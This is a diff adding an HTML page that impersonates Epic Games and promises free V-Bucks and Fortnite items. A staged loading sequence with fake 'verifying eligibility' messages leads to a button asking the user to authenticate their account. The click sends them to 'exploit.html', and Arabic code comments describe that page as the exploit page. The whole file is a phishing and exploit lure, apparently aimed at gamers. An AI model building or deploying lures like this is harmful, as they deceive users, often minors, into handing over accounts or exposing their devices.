@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Epic Games Special Offer</title>
+    <meta charset="UTF-8">
+    <style>
+        body { 
+            background-color: #121212; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 85vh;
+        }
+        .container {
+            max-width: 600px;
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        h1 { color: #0078f2; margin-bottom: 20px; }
+        .logo { max-width: 150px; margin-bottom: 20px; }
+        p { margin: 15px 0; line-height: 1.5; }
+        .btn { 
+            background: #0078f2; 
+            color: white; 
+            border: none; 
+            padding: 14px 30px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            border-radius: 4px; 
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #0066cc;
+        }
+        .loader {
+            width: 100%;
+            height: 5px;
+            background: #333;
+            margin: 20px 0;
+            border-radius: 3px;
+            overflow: hidden;
+            position: relative;
+        }
+        .loader:after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 100%;
+            background: #0078f2;
+            animation: load 2s linear forwards;
+        }
+        @keyframes load { to { width: 100%; } }
+        .hidden { display: none; }
+        .footer { margin-top: 20px; font-size: 12px; color: #888; }
+        .game { margin: 25px 0; }
+        .game img { max-width: 100%; border-radius: 8px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Games" class="logo">
+        
+        <div id="step1">
+            <h1>Fortnite Special Bundle</h1>
+            <p>Congratulations! You've been selected to receive exclusive Fortnite items and V-Bucks!</p>
+            
+            <div class="game">
+                <img src="https://cdn2.unrealengine.com/fortnite-chapter-2-season-5-key-art-3840x2160-e77c109cc3c8.jpg" alt="Fortnite">
+            </div>
+            
+            <p>Preparing your special bundle...</p>
+            <div class="loader"></div>
+            <p id="status">Connecting to Epic Games servers...</p>
+        </div>
+        
+        <div id="step2" class="hidden">
+            <h1>Ready to Claim!</h1>
+            <p>Your Epic Games exclusive bundle is ready!</p>
+            <p>You will receive:</p>
+            <ul style="text-align: left; display: inline-block;">
+                <li>5,000 V-Bucks</li>
+                <li>Exclusive Legendary Outfit</li>
+                <li>Special Weapon Wrap</li>
+                <li>Battle Pass Boost</li>
+            </ul>
+            <p>Click the button below to authenticate your Epic Games account and claim your rewards:</p>
+            <button class="btn" id="auth-btn">Connect & Claim Rewards</button>
+        </div>
+        
+        <p class="footer">© 2025 Epic Games Fan Project - Not affiliated with Epic Games Inc.</p>
+    </div>
+
+    <script>
+        // محاكاة تحميل
+        setTimeout(() => {
+            document.getElementById('status').textContent = "Verifying account eligibility...";
+        }, 1000);
+        
+        setTimeout(() => {
+            document.getElementById('status').textContent = "Preparing rewards package...";
+        }, 2000);
+
+        setTimeout(() => {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }, 3000);
+
+        // إعداد رابط الاستغلال
+        document.getElementById('auth-btn').addEventListener('click', function() {
+            // توجيه المستخدم إلى صفحة الاستغلال
+            window.location.href = 'exploit.html';
+        });
+    </script>
+</body>
+</html>
